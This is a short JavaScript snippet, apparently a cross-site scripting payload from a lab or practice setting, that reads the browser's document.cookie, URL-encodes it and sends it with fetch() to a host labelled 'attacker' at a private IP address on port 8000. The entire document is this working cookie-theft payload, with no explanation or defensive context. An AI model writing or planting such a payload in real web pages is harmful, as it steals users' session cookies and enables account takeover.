attacker = "192.168.45.157"

let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://" + attacker + ":8000/exfil?data=" + encodedCookie)
